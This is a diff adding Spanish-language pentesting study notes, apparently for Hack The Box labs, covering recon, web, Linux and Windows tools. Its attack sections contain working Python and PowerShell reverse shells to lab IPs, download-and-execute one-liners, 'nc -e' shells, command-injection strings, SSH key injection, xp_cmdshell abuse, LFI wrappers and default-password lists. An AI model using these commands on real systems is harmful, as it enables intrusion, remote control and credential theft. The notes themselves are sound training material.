@@ -1,0 +1,797 @@
+* Notes
+** Android
+*** Anbox + ADB
+    permite ejecutar apks en un container
+    requiere instalar snap
+    imagen se guarda en /snap/anbox/186/android.img
+
+   -iniciar servicio snapd
+       sudo systemctl start snapd
+   
+   -verificar que snap tenga anbox
+       sudo snap start anbox 
+       snap list
+
+EJECUTAR
+   -lanzar appmanager (?)
+       sudo snap run anbox.container-manager
+   
+   -lanzar anbox
+       anbox session-manager
+       /snap/bin/anbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity
+
+INSTALAR APPS
+   -verificar que adb detecte el contenedor
+       adb devices
+       
+   -instalar apk usando adb
+       adb install MyApp.apk
+     
+*** ADB
+    configurar proxy
+        adb shell settings put global http_proxy <tunX>:8080 (interfaz HTB, permite usar burp)
+    quitar proxy
+        adb shell settings put global http_proxy :0
+    obtener y reemplazar(requiere root) hosts file
+        adb pull /system/etc/hosts .    (al directorio actual)
+        (editar)
+        adb push hosts /system/etc
+*** apktool
+
+*** Directory structure
+    /boot
+    /system
+        /etc/
+            hosts
+    /recovery
+    /data
+    /cache
+    /misc
+    /sdcard
+    /sd-ext
+** Archivos
+*** pfx
+    PKCS#12 (public key cryptography standard)
+    abrir haciendo doble clic o con openssl
+    contiene certificado SSL(llave publica), llave privada e intermediate certificate.
+
+
+    LLAVE PRIVADA(este archivo tambien contiene el cert)
+openssl pkcs12 -in file.pfx -nocerts -out private.key
+openssl pkcs12 -in file.pfx -nocerts -out private.key -nodes   (si te pide PEM)
+
+
+    LLAVE PUBLICA/CERTIFICADO
+openssl pkcs12 -in file.pfx -clcerts -nokeys -out cert.crt
+
+    usar crackpkcs12 (con rockyou) para crackear (tardado)
+        crackpkcs12 -d /usr/share/wordlists/rockyou.txt file.pfx
+
+    o bien sacar el hash (pfx2john) y crackear con john
+        pfx2john file.pfx >filehash.hash
+        john -w=/usr/share/wordlists/rockyou.txt filehash.hash --rule /usr/share/john/rules/rockyou-30000.rule
+
+** Ataques
+*** Brute force
+    /usr/share/wordlists/rockyou.txt
+
+MANUAL
+cat rockyou.txt| 
+while read p; do 
+  echo trying $p; 
+  openssl pkcs12 -in "xyz.p12"  -passin "pass:$p"; 
+  RC=$?; if [ $RC -eq 0 ]; then 
+break; fi ; done
+
+*** Inyeccion de comandos bash
+    "a; bash -p"
+    "a && bash -p" 
+*** Reverse shell
+    revshells.com
+**** Linux con Python
+1. Lanzar listener en máquina atacante
+   nc -lvp 1337
+
+2. En máquina víctima lanzar socket a la IP atacante (puerto en escucha)
+python -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.16.2",1337));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
+
+**** Windows powershell
+Descargar y ejecutar con powershell (powershell -c ./revshell NO LLEVA EXTENSION AL EJECUTAR)
+     
+ONE-LINER PARA REVSHELL(NO SIEMPRE FUNCIONA)
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.64",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+ 
+DESCARGA Y EJECUTA ARCHIVO POWERSHELL(PS1):
+opcion1
+powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.36/revshell.ps1\");"
+     donde revshell.ps1:
+     $client = New-Object System.Net.Sockets.TCPClient('10.10.14.36',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+
+opcion2                                                                 tu(servidorweb)               (ruta destino en windows)
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/ms11-046.exe', 'c:\Users\Public\Downloads\ms11-046.exe')"
+
+DESCARGA ARCHIVO:
+Powershell.exe invoke-webrequest -Uri http://10.10.14.18/bfill.exe -OutFile bfill.exe
+
+
+
+*** Inyección de llaves ssh
+     si se logra inyección de comandos, puedes inyectar llave en
+     /home/user/.ssh/authorized_keys       (append)
+     /root/.ssh/authorized_keys
+
+     tambien puedes crear link simbolicos (si tienes privilegio root para crear/descargar archivo)
+     ln -s /root/.ssh/authorized_keys llave_inyectada.pub
+
+     usa scp para enviar archivos
+** C
+*** access
+#+BEGIN_SRC c
+    int access(const char *pathname, int mode);
+#+END_SRC 
+    indica si el proceso puede acceder a un archivo
+    *si pathname es symlink, se dereferencia!!!
+    utiliza el REAL uid, NO el effective uid
+    se puede explotar mediante symlinks:
+      si el usuario que lo lanza tiene permiso para el symlink, aunque no tenga
+      para el archivo al que apunta
+    mode:
+         7 rwx
+         6 rw
+         5 rx
+         4 r
+         2 w
+         1 x
+         
+    
+*** geteuid
+*** seteuid
+*** snprintf
+** Common credentials/passwords
+para HTB, prueba el mismo nombre de usuario
+
+   
+admin123
+root123
+password1
+administrator1
+changeme1
+password123
+qwerty123
+administrator123
+changeme123
+** Linux general
+*** bash
+**** parametros posicionales
+     $0      : nombre del shell o programa actual
+     $1      : primer argumento
+     ${n}    : n-avo argumento
+     $* | $@ : todos los argumentos
+**** AND logico &&, -a
+     evitar -a, es ambiguo
+**** OR logico ||, -o
+     evitar -o, es ambiguo
+    comando1 || comando2 || comando 3 
+       si comando1 devuelve false, ejecuta comando2
+       solo si comando1 y comando2 devuelven false se ejecuta comando3
+**** if
+     if [ expr ]; then
+       [ command ]
+     else
+     fi
+***** tests:
+     -n
+     -d
+     -z
+*** permisos
+**** sticky bit (t)
+     solo el dueño o root puede eliminar 
+     chmod +t
+     chmod 1ugo
+**** setuid (s)
+     cuando un archivo tiene s en los permisos significa que cuando un
+     usuario lo ejecuta lo hace como el dueño del archivo
+     chmod u+s
+     chmod 4ugo 
+
+     el effective id es el del dueño del archivo, no de quien lo ejecuta
+     (a diferencia del caso comun que euid y uid son el mismo)
+
+     bash -p lanza un shell
+**** setgid (s)
+     permite ejecutar un archivo como si fueras miembro del grupo dueño
+     chmod g+s
+     chmod 2ugo
+
+*** archivos/servicios
+**** /etc/cron
+     cron: DAEMON, ejecuta los comandos especificados
+     crontab(file): contiene instrucciones para el daemon cron
+                    cada usuario tiene un crontab file
+     crontab(instruccion): "instala"/"desinstala" o lista las tablas
+     si la maquina esta apagada a la hora que le toca a un cronjob, no se ejecuta
+       para eso existe el paquete anacron
+**** /etc/passwd
+**** /etc/shadow
+     guarda contraseñas cifradas
+
+*** stdin/stdout/stderr
+**** 2>/dev/null
+     redirige (no imprime) errores
+
+*** usuarios
+    useradd <user>
+    passwd <user>: enter pass
+** Linux Commands
+*** 7z
+    7z l <archivo.zip>: lista todos los archivos (incluso ocultos) en un zip
+*** amass
+    OWASP Amass
+    enumeracion de DNS/dns:
+amass enum -passive -d <url> -src
+
+
+    visualiza el grafo de dominios:
+amass viz -d3 -d <URL>
+*** base64
+    uso: base64 [-d] file
+  encode: no option
+  decode: -d
+
+*** bash
+    lanza shell
+    -p : si euid y real uid son diferentes(ejecutables setuid), se usa euid
+           al lanzar el shell
+*** bzip2
+    -d decompress (does not overwrite)
+**** descripcion
+     Burrows-Wheeler block sorting compression, Huffman coding
+
+*** cat
+    archivos con simbolo - en el nombre
+    cat ./-
+
+*** crackpkcs12
+    mas info https://github.com/crackpkcs12/crackpkcs12
+    -h: help
+    -d file: dictionary
+
+    crackpkcs12 -d /usr/share/wordlists/rockyou.txt file.pfx
+
+*** cut
+    elimina partes de lineas de algun archivo/stdin e imprime en stdout
+    -b selecciona solo estos bytes
+      echo $(string) | cut -b 1-10 (muestra primeros 10 bytes)
+    -c selecciona solo estos chars
+      echo $(string) | cut -c 1-10 (muestra primeros 10 chars)
+
+    -d delimiter, default es TAB (SOLO CON -f)
+    -f selecciona solo estos campos(fields)
+      echo $(string) | cut -d ' ' -f 1,2 (separa por espacios, muestra primeras 2)
+
+*** crontab
+    modifica crontab que ejecuta el cron daemon
+   -u especifica usuario: -u alex
+   -l muestra crontab actual
+   -r borra crontab actual
+   -e edita crontab
+*** diff
+    muestra diferencias entre archivos
+    diff file1 file2
+*** dnsrecon
+dnsrecon -d <dominio> 
+dnsrecon -d <dominio> -t axfr
+*** evil-winrm
+    
+*** fcrackzip
+    permite hacer bruteforcing a zips
+    password protected zips
+    -b: usa todas las combinaciones posibles de las letras ingresadas
+    -D dictionary: usa un archivo
+    -p string: si usas -D, es el nombre del diccionario
+               si usas -b, es el conjunto de letras
+    -u zip: unzip
+
+    fcrackzip -D -u file.zip -p /usr/share/wordlists/rockyou.txt
+    
+*** file
+   obtiene informacion sobre un archivo(esta zipeado, cifrado, ascii, etc)  
+
+*** find
+  uso: find [in this path] [! | -not][tests]
+       find -type f -user alex
+**** TESTS
+***** -executable
+***** -group
+***** -name | -iname(case insensitive) 
+***** -newer
+***** -size
+    uso: find -size 1024c
+       b bloques de 512 bytes
+       c bytes
+       w words (2 bytes)
+       k KB
+       M MB
+       G GB
+***** -type
+       b bloque
+       c caracter
+       d directorio
+       p pipe
+       f file
+       l symlink
+       s socket
+    
+***** -user
+
+**** exec
+     para cada archivo/directorio encontrado, ejecutar un comando
+     en {} se sustituye el nombre del archivo actual
+     '' para evitar ejecutar si tiene puntos o algo
+     find . -type f -exec file '{}' \; (ejecuta file en cada archivo en el dir)
+       
+*** ftp
+   Conexion:
+    ftp host [port]
+
+   Revisa si permite anonymous login!! username: anonymous
+
+    Interaccion y transferencia
+    ftp>help
+    ftp>ls
+    ftp>get file.txt
+    ftp>put file.txt 
+*** git
+    git clone <repo> [/.../dest/dir]
+    git branch -a         : mustra todas las branches del repo
+    git checkout <branch>
+    git log               : muestra historia de commits
+            -p            : mustra commits y los cambios hechos. (en una ventana de less)
+    git tag               : muestra tags
+            "string"      : incluye una cadena al buscar tags
+            -a <tagNumber> [-m "message"]  : crea annotated tag
+            -d <tagNumber>                 : elimina tag
+    git tag -a <number> <checksum>   : permite taggear commits viejos
+    git show <tag>        : muestra contenidos del tag (commit taggeado)
+                                                        o nombre del commit
+*** grep
+    -i ignorecase
+    -v invert selection
+    uso:
+    grep [options] pattern file
+*** gzip
+    -d decompress (needs to be .gz file) overwrites file.
+
+*** html2text
+    convierte html a texto legible. util con curl, wget, respuestas de peticiones
+  
+*** id
+    muestra ids de usuario y grupos para algun usuario
+    uso: id [usuario]
+    sin opcion: usuario actual
+    -g: group id
+    -G: all groups
+*** impacket
+    impacket-paquete -h
+**** mssqlclient
+    impacket-mssqlclient username:pass@10.10.10.10 -windows-auth
+
+    -windows-auth DEFAULT OFF!
+
+    aunque la credencial tenga \ impacket es linux, usa /
+    una vez autenticado puedes intentar descargar(desde la victima) binarios
+       para RCE
+
+    xp_cmdshell es un PROCEDURE que permite ejecutar comandos a nivel consola
+
+
+    SQL SERVER
+    SQL> help
+    SQL> sp_configure;     # muestra opciones
+    SQL> exec sp_configure 'show advanced options', 1;  reconfigure;
+    SQL> exec sp_configure 'xp_cmdshell', 1;     
+    SQL> enable_xp_cmdshell                           #igual que el de arriba
+
+    SQL> xp_cmdshell {comando}                # requiere admin privs
+    SQL> xp_cmdshell "powershell -c COMANDO; COMANDO"
+    SQL> xp_cmdshell "powershell -c ls "C:/"
+    SQL> 
+    SQL> 
+    SQL> 
+    SQL> select name from master.dbo.sysdatabases; # lista DBs
+    SQL> use DB;                                   # selecciona BD
+    SQL> select * from DB.information_schema.tables; # lista tablas de una BD
+    SQL> 
+    SQL> 
+    SQL> 
+    SQL> 
+    SQL> 
+    SQL> 
+**** psexec
+     ejecuta shell remoto en windows, (mediante SMB??)
+     impacket-psexec user@host
+*** ltrace
+    traces LIBRARY CALLS
+    call tracer: ejecuta un comando(incluyendo ejecucion de binarios),
+                 interceptando y mostrando syscalls y señales
+    ltrace <command>
+           -o <file>  : guarda el resultado en archivo en lugar de mostrarlo
+
+    resultado:
+    syscall(arguments) = exit_status
+*** md5sum
+    obtiene MD5:
+    md5sum <archivo>
+    echo string | md5sum
+*** more
+    visualiza archivos
+    toma en cuenta el tamaño de la ventana!
+    q salir
+    v lanza tu editor
+*** mysql
+    herramienta para mariaDB
+    usuario root a veces no requiere password
+
+    mysql -u root -P 3306 -h 10.10.10.10
+
+
+    MYSQL
+    show databases;
+    use database;
+    show tables;
+    database.
+*** nmap
+    mas enumeracion, busca el servicio
+    /usr/share/nmap/scripts
+    nmap -p339 --script=SCRIPTNAME host
+    nmap -sV 
+    
+    DESCRIPCION
+    manda pings a los puertos, si responden los considera activos y escanea servicios
+
+    -Pn skips host discovery (no manda pings, escanea todo)
+                                       pings pueden alertar al firewall
+    -sV service version
+    -sC default scripts, muestran mas info pero son intrusivos y algunas empresas
+          no lo permiten
+    -T5 fastest
+    -A identify OS, traceroutes,  build, etc
+    -p scan ALL PORTS
+    -script vuln: automaticamente busca VULNS!!!! esta opcion va antes del host
+    
+**** scripts
+    http-enum: intenta con un pequeño diccionario, tipo dirbuster-small.txt
+        nmap --script http-enum -p80 host
+
+*** nc
+    netcat: TCP/UDP utility
+    reads and writes data in the network
+**** Client mode(connects/"sends")
+     si necesitas enviar varias lineas, cat envia una por una
+     nc [options} <host> [port]
+     echo "mensaje" | nc <host> port
+     nc <host> port
+         -> mensaje
+         
+    especifica que se lance un shell
+    nc -e /bin/sh nc host port
+**** Server mode (listens)
+     nc -l -p port 
+     nc -nlvp port
+
+*** openssl
+**** Extracting
+    permite extraer certificados de archivos compatibles
+    
+    archivos pfx (PKCS#12)
+    -extraer certificado
+openssl pkcs12 -in Certificate.pfx -clcerts -nokeys -out Certfilechain.crt
+
+    -extraer llave publica
+openssl pkcs12 -in file.pfx -out cert.pem
+
+    -extraer llave privada
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
+**** Client-server
+    modos cliente y servidor similares a netcat, pero TLS/SSL
+     realiza conexiones, obtiene informacion de certificado TLS/SSL
+     puerto default es 4433
+     -ign_eof evita que se cierre la conexion
+     uso:
+     openssl s_client ign_eof -connect <host>:<port>
+       -> mensaje
+
+*** python
+servidor web
+python3 -m http.server 80
+*** seq
+    genera secuencias
+    seq 1 100 
+    -w permite leading zeroes   -> 001,002,...
+*** smbclient
+    1. tu maquina lanza connection request
+    2. servidor lanza authentication request
+    3. tu maquina lanza authentication response, default tu nombre de maquina
+    4. servidor lanza connection response
+
+    carpetas que acaban con $ son administrativas
+    cuenta default: Administrator
+ 
+   --help 
+   -L list
+   -N nopassword
+   -U user
+
+   
+   smbclient -L host
+                     -U Administrator
+   smbclient \\\\host\\folder
+
+   smb: \> help
+   smb: \> cd dir
+   smb: \> get file.txt
+  
+*** smbmap
+     enumera drives SMB en todo un dominio, identifica puertos
+    
+    smbmap -H host_ip
+*** sort
+    devuelve las lineas ordenadas
+    uso: sort <file>
+    -r reverse order
+    -n numerically
+
+*** stat
+    muestra status de archivo(incluyendo binarios de sistema) o carpeta:
+    tamaño, fechas creacion, modificacion, acceso, inode, etc
+    -c mismo que --format
+    --format %U (dueño)
+             %G (grupo)
+             %Y (ultima fecha de modificacion)
+             
+*** strace
+    traces SYSTEM CALLS 
+*** ssh
+ CONEXION
+    ssh -p<port> <user>@<host>
+    ssh -i <key> <user>@<host>  (usando llave !! permisos 600!!)
+    ssh -p<port> <user>@<host> comando  (ejecuta commando una vez logeado)
+    
+  GENERAR LLAVES
+ssh-keygen
+introduce nombre para generar en carpeta actual, si no se va a .ssh
+**** scp
+secure copy
+
+usando llave:
+    scp -i /home/kali/.ssh/id_rsa archivo user@host:path
+    ejemplo
+       scp -i id_rsa linenum.sh paul@routerspace.htb:~
+    
+*** strings
+    outputs only printable strings in a file
+
+*** sublist3r
+sublist3r --help
+sublist3r -d dominio.com
+*** tar
+    uso: tar -xf archivo.tar
+    -c create
+    -x extract
+    -f use file
+
+*** telnet
+    telnet -l user host port
+    (try root!)
+*** theHarvester
+    OSINT, busca información sobre un dominio, empleados, emails, etc.
+theHarvester --help theHarvester -d <dominio/nombre de la empresa> -b google,linkedin,bing,twitter,sublist3r
+*** timeout
+    ejecuta comando con limite de tiempo. si se pasa lo mata
+    -s especifica SIGNAL (ver kill) 
+    -k si por alguna razon no se termina el proceso, manda señal KILL tras añadir esta duracion
+
+    uso:
+    timeout -s 9 60 [command]
+    timeout 10m ping <host>
+            5 (segundos)
+*** tr
+    "translate" (substitute characters)
+    stego, rot13
+    uso: tr 'conjunto' 'transformacion'
+**** rot13
+     tr 'a-zA-Z' 'n-za-mN-ZA-M'
+
+*** uniq
+    -u prints unique lines (must be sorted, i think)
+    -c prints every line once, counts occurrences
+
+*** unzip
+    -P pass: password
+*** vim
+    :e cambia de archivo - util para explotar si tienes acceso a vim
+    :shell LANZA SHELL**** PELIGRO
+    :set shell=/bin/sh
+               /bin/bash
+               /usr/bin/zsh
+*** wfuzz
+   directory busting:
+wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.135/FUZZ
+
+
+busting para archivos con extension .php 
+wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.135/FUZZ.php
+
+    -hc: hide code
+    -t:  numero de hilos/threads
+    -w:  wordlist
+    -L:  en caso de estado 302(redirect) sigue al redirect y devuelve el estado de la pagina final
+    FUZZ: aqui se sustituye
+*** wget
+    wget URL                            #info for site
+    wget HOST/file -outfile NEWNAME     #download file from a host
+    
+    -v verbose
+*** whatweb
+     identifica servicios wordpress, joomla, etc
+     whatweb <host>
+
+*** xfreerdp
+    Permite conectarse a RDP windows
+
+    xfreerdp /v:10.0.0.10 /u:alex /p:password
+             /cert:ignore
+    
+    usuario comun: Administrator
+*** xxd
+    hex dump
+    
+** Privilege escalation/privesc
+*** linux
+sudo -l (prueba qué comandos puedes ejecutar)
+uname -a (version kernel, busca vulns)
+cronjobs
+inyección de llaves ssh
+
+
+linpeas, linenum
+** Reconaissance
+ IP 
+    host 
+    nslookup
+    traceroute
+
+DNS
+/seclists/Discovery/DNS/...
+     dnsrecon
+     dig
+     dnsdumpster.com
+     amass
+     sublist3r
+     knockpy
+ 
+ZONE TRANSFERS
+     dnsrecon
+     fierce
+
+firewall/proxy: wafw00f
+
+OSINT
+     theHarvester
+     whois
+     netcraft.com
+     dnsdumpster.com
+     whatweb
+    
+PORTS
+     nmap
+     nikto
+
+** Web
+   wappalyzer, busca vulns
+   whatweb
+   cmsmap
+*** Apache
+    pagina vacia -> curl para ver mas
+*** Jenkins
+     Credenciales default:
+     | USER  | PASSWORD  |
+     |-------+-----------|
+     | admin | password  |
+     | admin | admin     |
+     | root  | root      |
+     | root  | password  |
+     | admin | admin1    |
+     | admin | password1 |
+     | root  | password1 |
+
+     links
+https://github.com/gquere/pwn_jenkins
+https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins
+
+Corre scripts en Groovy!
+RCE https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+*** WordPress
+    hasta 5.2.3:
+     añadir sufijo “?static=1” a la URL, se pueden observar publicaciones privadas
+***** wpscan
+      wpscan --url URL 
+*** Burp Suite
+**** proxy
+     intercepta peticiones y respuestas HTTP
+     proxy->intercept
+       intercept is on
+       lanza chromium preconfig o usa foxyproxy
+*** Firefox
+    F12: Developer mode
+    Storage: guarda cookies
+*** Directory busters
+**** dirbuster
+     seleccionar lista /usr/share/dirbuster/...
+**** gobuster
+     especifica primero dir/dns/...
+     -h
+     -u url
+     -x extensions
+     -w wordlist
+
+     gobuster dir -u host -w wordlist [-x php,html,txt]
+
+     WORDLISTS
+     /usr/share/seclists/
+     /usr/share/wordlists/
+     /usr/share/wordlists/dirb/big.txt
+*** robots.txt
+    Disallow lista carpetas o archivos a los que no quieres que accedan crawlers
+              o indexen los motores de busqueda
+*** Spoofing requests
+**** con burpsuite + foxyproxy
+**** tamper data
+     añadir campo Referer
+    
+*** Service Identifiers
+    wappalyzer(firefox)
+    whatweb(CLI)
+*** URLs
+    .../index.php?page=/folder_on_machine
+
+*** PHP
+    sintaxis
+http://domino/archivo.php?parametro=valor
+
+haz dirbusting en sitio principal para obtener archivos php.
+
+Si obtienes pagina en blanco sin error, prueba a fuzzear parametros que permitan acceder a archivos
+wfuzz ... dominio/archivo.php?FUZZ=/etc/passwd
+
+
+
+WRAPPER para LFI
+php://filter/resource=index
+php://filter/convert.base64-encode/resource=index
+
+** Windows
+checa privilegios
+corre winpeas
+*** DOS (y PS)   
+net user             (lista usuarios)
+net user <usuario>   (lista info del usuario)
+whoami
+whoami /priv  (lista privilegios)
+*** Powershell
+ejecutables ./winpeas.exe 
+HISTORIAL: C:\Users\usuario\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    ls, cd, pwd
+    netcat: 
+       https://github.com/int0x33/nc.exe 
+
+    wget
+       wget HOST/file -outfile NEWNAME
+
